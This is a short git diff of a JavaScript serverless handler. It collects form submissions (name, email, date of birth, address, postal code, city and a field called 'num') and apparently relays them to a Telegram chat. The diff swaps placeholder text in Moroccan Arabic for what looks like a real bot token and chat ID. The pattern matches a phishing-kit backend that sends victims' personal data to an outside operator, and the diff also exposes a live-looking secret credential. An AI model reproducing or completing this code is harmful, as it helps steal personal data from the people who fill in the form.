@@ -7,8 +7,8 @@ export default async function handler(req, res) {
 
   const { first_name, last_name, email, dob, address, postal, city, num } = req.body;
 
-  const BOT_TOKEN = "هنا تحط Token ديال البوت ديالك";
-  const CHAT_ID = "هنا تحط Chat ID ديالك";
+  const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
+  const CHAT_ID = "-4982276528";
 
   const message = `
 📨 بيانات جديدة:
@@ -34,3 +34,4 @@ export default async function handler(req, res) {
     res.status(500).json({ message: "خطأ أثناء الإرسال" });
   }
 }
+
